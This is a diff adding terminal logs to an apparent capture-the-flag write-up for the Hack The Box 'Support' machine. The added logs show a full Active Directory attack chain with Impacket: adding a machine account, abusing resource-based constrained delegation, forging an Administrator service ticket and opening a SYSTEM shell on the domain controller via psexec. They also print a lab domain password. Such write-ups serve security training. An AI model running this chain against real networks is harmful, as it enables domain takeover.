@@ -776,3 +776,73 @@ PropagationFlags      : None
 *Evil-WinRM* PS C:\Users\support\Desktop>
 
 ```
+
+``` bash
+
+❯ impacket-addcomputer support.htb/support:'Ironside47pleasure40Watchful' -computer-name FAKE01 -computer-pass 'Password123!'
+
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
+
+[*] Successfully added machine account FAKE01$ with password Password123!.
+❯ impacket-rbcd support.htb/support:'Ironside47pleasure40Watchful' -action write -delegate-to 'DC$' -delegate-from 'FAKE01$' -dc-ip 10.129.230.181
+
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
+
+[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
+[*] Delegation rights modified successfully!
+[*] FAKE01$ can now impersonate users on DC$ via S4U2Proxy
+[*] Accounts allowed to act on behalf of other identity:
+[*]     FAKE01$      (S-1-5-21-1677581083-3380853377-188903654-6101)
+❯ impacket-getST support.htb/'FAKE01$':'Password123!' -spn cifs/dc.support.htb -impersonate Administrator -dc-ip 10.129.230.181
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
+
+[-] CCache file is not found. Skipping...
+[*] Getting TGT for user
+[*] Impersonating Administrator
+[*] Requesting S4U2self
+[*] Requesting S4U2Proxy
+[*] Saving ticket in Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
+╭─ ~/hacking/ctf/htb/easy/support/scripts                                                                          ✔ ─╮
+╰─                                                                                                                   ─╯
+
+
+```
+
+
+``` bash
+
+❯ export KRB5CCNAME=Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
+
+❯ klist
+Ticket cache: FILE:Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
+Default principal: Administrator@support.htb
+
+Valid starting       Expires              Service principal
+08/06/2026 20:11:33  08/07/2026 06:11:33  cifs/dc.support.htb@SUPPORT.HTB
+        renew until 08/07/2026 20:11:56
+❯ impacket-psexec -k -no-pass dc.support.htb
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
+
+[-] [Errno Connection error (dc.support.htb:445)] [Errno -2] Name or service not known
+❯ echo '10.129.230.181 dc.support.htb' | sudo tee -a /etc/hosts
+
+10.129.230.181 dc.support.htb
+❯ impacket-psexec -k -no-pass dc.support.htb
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
+
+[*] Requesting shares on dc.support.htb.....
+[*] Found writable share ADMIN$
+[*] Uploading file aPUtBJso.exe
+[*] Opening SVCManager on dc.support.htb.....
+[*] Creating service cEbt on dc.support.htb.....
+[*] Starting service cEbt.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.20348.859]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32> whoami
+nt authority\system
+
+C:\Windows\system32>
+
+```
